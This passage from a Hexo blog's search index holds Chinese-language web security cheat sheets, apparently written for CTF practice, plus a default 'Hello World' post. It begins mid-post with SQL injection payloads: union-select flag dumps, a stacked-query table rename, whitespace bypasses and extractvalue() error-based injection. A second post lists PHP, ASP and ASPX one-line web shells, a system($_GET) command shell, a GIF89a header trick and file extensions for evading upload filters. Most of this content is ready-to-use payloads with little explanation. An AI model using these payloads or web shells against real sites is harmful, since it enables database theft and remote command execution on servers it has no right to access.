&#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table#</span><br></code></pre></td></tr></table></figure><h2 id="8-使用-LIMIT-获取特定数据"><a href="#8-使用-LIMIT-获取特定数据" class="headerlink" title="8. 使用 LIMIT 获取特定数据"></a>8. 使用 <code>LIMIT</code> 获取特定数据</h2><p>使用 <code>LIMIT</code> 获取特定数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(fl4g) from secret_table limit 3,1#</span><br></code></pre></td></tr></table></figure><h2 id="9-改名操作"><a href="#9-改名操作" class="headerlink" title="9. 改名操作"></a>9. 改名操作</h2><p>猜测回显的数据库表字段，改变表名使回显到 <code>flag</code> 字段：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;alter table words rename words1; alter table `1919810931114514` rename words; alter table words change flag id varchar(100);#</span><br></code></pre></td></tr></table></figure><p>使用以下语句得到回显：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1;#</span><br></code></pre></td></tr></table></figure><h2 id="10-空格绕过"><a href="#10-空格绕过" class="headerlink" title="10. 空格绕过"></a>10. 空格绕过</h2><p>使用 <code>/**/</code> 代替空格或使用 <code>()</code>，<code>()</code> 两边不用空格：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">where</span>(<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h2 id="11-报错注入"><a href="#11-报错注入" class="headerlink" title="11. 报错注入"></a>11. 报错注入</h2><h3 id="11-1-extractvalue-报错注入"><a href="#11-1-extractvalue-报错注入" class="headerlink" title="11.1 extractvalue() 报错注入"></a>11.1 <code>extractvalue()</code> 报错注入</h3><p><code>extractvalue()</code> 函数用于从XML文档中提取数据。通过构造错误的XPath表达式，可以触发报错并获取信息。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure><h3 id="11-2-为什么使用-0x7e"><a href="#11-2-为什么使用-0x7e" class="headerlink" title="11.2 为什么使用 0x7e"></a>11.2 为什么使用 <code>0x7e</code></h3><p><code>0x7e</code> 是ASCII码中的 <code>~</code> 符号，XPath语法不支持该符号，因此总能触发报错。其他不支持的字符如 <code>!</code> 也可以使用。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-number">0x7e</span>, database()));<br></code></pre></td></tr></table></figure><h3 id="11-3-其他报错注入方法"><a href="#11-3-其他报错注入方法" class="headerlink" title="11.3 其他报错注入方法"></a>11.3 其他报错注入方法</h3><p>使用其他不支持的字符也可以达到同样的效果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">extractvalue(<span class="hljs-keyword">null</span>, concat(<span class="hljs-string">&#x27;!&#x27;</span>, database()));<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一句话木马与文件头过滤</title>
    <link href="/2025/01/21/%E6%9C%A8%E9%A9%AC/"/>
    <url>/2025/01/21/%E6%9C%A8%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="一句话木马与文件头过滤"><a href="#一句话木马与文件头过滤" class="headerlink" title="一句话木马与文件头过滤"></a>一句话木马与文件头过滤</h1><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h3 id="PHP-一句话木马"><a href="#PHP-一句话木马" class="headerlink" title="PHP 一句话木马"></a>PHP 一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pass&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[aaa]) <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">// 短标签绕过 PHP</span><br></code></pre></td></tr></table></figure><h3 id="ASP-一句话木马"><a href="#ASP-一句话木马" class="headerlink" title="ASP 一句话木马"></a>ASP 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asp">&lt;%eval request (&quot;pass&quot;)%&gt;<br></code></pre></td></tr></table></figure><h3 id="ASPX-一句话木马"><a href="#ASPX-一句话木马" class="headerlink" title="ASPX 一句话木马"></a>ASPX 一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspx">&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;<br></code></pre></td></tr></table></figure><h3 id="PHP-另一种形式"><a href="#PHP-另一种形式" class="headerlink" title="PHP 另一种形式"></a>PHP 另一种形式</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mochu7&#x27;</span>]);&lt;/script&gt;<br></code></pre></td></tr></table></figure><h2 id="文件头过滤"><a href="#文件头过滤" class="headerlink" title="文件头过滤"></a>文件头过滤</h2><h3 id="GIF89a"><a href="#GIF89a" class="headerlink" title="GIF89a"></a>GIF89a</h3><p>在文件开头添加 <code>GIF89a</code> 可以绕过一些文件头检测。</p><h2 id="可执行命令一句话"><a href="#可执行命令一句话" class="headerlink" title="可执行命令一句话"></a>可执行命令一句话</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>&lt;? @system($_GET[&quot;cc&quot;]); ?&gt;<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行 HTML</p><h2 id="文件后缀"><a href="#文件后缀" class="headerlink" title="文件后缀"></a>文件后缀</h2><p>以下是一些常见的文件后缀，可以用于绕过文件上传检测：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;.php&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.php2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;php1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.phtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pht&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp5&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp4&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp3&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHp2&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;pHp1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Html&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.Htm&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.pHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jsv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jspf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSw&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSv&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jSpf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.jHtml&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aspx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ascx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.ashx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.asmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cer&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSp&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSpx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSa&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSax&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aScx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aShx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.aSmx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.cEr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.sWf&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;.swf&quot;</span><br></code></pre></td></tr></table></figure><h2 id="PHP-解析配置"><a href="#PHP-解析配置" class="headerlink" title="PHP 解析配置"></a>PHP 解析配置</h2><p>PHP 文件需要在 Apache 的 <code>httpd.conf</code> 中有如下配置代码，才能正确解析：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AddType</span> application/x-httpd-php .php .phtml .phps .php5 .pht<br></code></pre></td></tr></table></figure><p>如果没有配置，访问时将会显示空白页。</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/01/21/hello-world/"/>
    <url>/2025/01/21/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
